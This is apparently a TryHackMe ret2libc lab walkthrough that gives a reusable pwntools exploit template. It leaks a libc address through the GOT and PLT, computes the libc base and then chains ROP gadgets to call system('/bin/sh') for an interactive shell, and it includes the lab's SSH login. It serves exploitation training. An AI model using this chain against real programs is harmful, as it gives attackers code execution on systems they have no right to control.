https://tryhackme.com/room/ret2libc

https://stacklikemind.io/ret2libc-aslr


First, we set up the binaries.
It's very important to download the `libc.so.6` from the target machine, or you won't be able to grab the offsets.
```
from pwn import *
elf = ELF("ret2libc")

rop = ROP(elf)
libc = ELF('./libc.so.6')
context.binary = elf
```

Second, we set up the connection. This is for SSH, if this is a local exploit just use `p = elf.process()`
```
s = ssh(user="andy",password="ret2libc!", host="10.10.142.174")
p = s.process("./exploit_me")
```

Third, we set up the exploit to leak the GOT and PLT addresses. Make sure to change the padding.
Note: Sometimes there is no `gets` function. In that case, use any other "linked" function.
```
padding = b'A'*18
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # Load the gadget address in
payload += p64(elf.got.gets) # Load the GETS address into the RDI register (first argument on x86_64)
payload += p64(elf.plt.puts) # Load the address of PUTS, so it will print the argument (the address of GETS)
payload += p64(elf.symbols.main) # Load the return address of the main() function, for the second payload.
```

The fourth step requires more customization, as you'll have to set the first amount of `p.recvline()` 
Note: if there are any characters not recieved, the exploit will not work. Use `p.recvuntil("LAST CHARACTERS")` if there is no clear newline.
If there's still trouble, use `print(p.clean())` to flush the entire stdout.
```
print(p.recvline()) # CHANGE THIS
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\0'))
p.recvline()
```


```
log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

```

This is the same code as in the fourth step, make sure to change the `recvline()` amount
```
p.recvline() # CHANGE THIS
p.sendline(payload)
p.interactive()
```